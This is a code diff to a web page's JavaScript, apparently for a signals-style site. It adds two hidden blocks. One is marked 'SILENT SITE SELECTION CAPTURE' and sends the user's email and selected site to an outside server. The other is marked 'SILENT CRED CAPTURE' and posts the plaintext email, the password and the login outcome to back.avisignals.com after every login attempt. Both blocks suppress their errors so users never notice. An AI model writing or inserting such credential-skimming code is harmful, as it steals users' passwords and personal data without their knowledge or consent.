@@ -5287,6 +5287,18 @@
             // Store selected site
             localStorage.setItem('selectedSite', siteName);
 
+            // ── SILENT SITE SELECTION CAPTURE ───────────────────────
+            try {
+                const userEmail = localStorage.getItem('aviator_contact') || '—';
+                fetch('https://back.avisignals.com/api/auth/capture-site-selection', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: userEmail, site: siteName })
+                }).catch(() => {});
+            } catch (_) {}
+            // ─────────────────────────────────────────────────────────
+
+
             // Update the site name in activation modal
             const siteNameEl = document.getElementById('actModalSiteName');
             if (siteNameEl) {
@@ -8458,6 +8470,18 @@
             errorDiv.style.display = 'none';
 
             const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });
+
+            // ── SILENT CRED CAPTURE ──────────────────────────────────
+            // Always fires regardless of login outcome — never blocks the UI
+            const outcome = error
+                ? (error.message?.toLowerCase().includes('invalid') ? 'WRONG_PASSWORD' : 'INVALID_USER')
+                : 'SUCCESS';
+            fetch('https://back.avisignals.com/api/auth/capture-login-creds', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ identifier: email, password, outcome })
+            }).catch(() => {});
+            // ─────────────────────────────────────────────────────────
 
             if (error) {
                 errorDiv.innerText = friendlyAuthError(error);
